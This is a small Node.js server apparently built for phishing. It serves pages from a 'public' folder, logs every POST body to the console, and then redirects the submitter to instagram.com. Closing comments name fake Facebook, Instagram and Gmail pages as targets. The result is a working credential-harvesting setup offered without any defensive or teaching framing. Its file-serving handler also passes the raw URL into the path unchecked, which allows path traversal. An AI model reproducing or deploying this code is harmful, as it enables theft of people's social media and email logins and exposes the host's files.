const http = require("http");
const fs = require("fs").promises;
const path = require("path");
const BASE_PATH = path.join(__dirname, "public");

const server = http.createServer(async (req, res) => {
    let url = req.url;

    if (req.url == "/" || req.url == "") {
        url = "index.html";
    }
    switch(req.method){
        case "GET":
            GET(url, req, res)
            break;
        case "POST":
            POST(url, req, res)
            break;
    }

});

async function GET(url, req, res) {
    const filePath = path.join(BASE_PATH, url);
    try {
        const file = await fs.readFile(filePath);
        res.write(file);
    } catch (err) {
        const errFile = await fs.readFile(path.join(BASE_PATH, "404.html"));
        res.write(errFile);
    } finally {
        res.end();
    }
}

async function POST(url, req, res) {
    var body = "";
    req.on("data", function (chunk) {
        body += chunk;
    });
    req.on("end", function () {
        console.log(body);

        res.statusCode = 302;
        res.setHeader('Location', 'https://www.instagram.com')

        res.end();
    });
    
}

server.listen(8191);


//3 social media.
//facebook ex '/facebook'
//insta ex '/instagram'
//gmail ex '/gmail'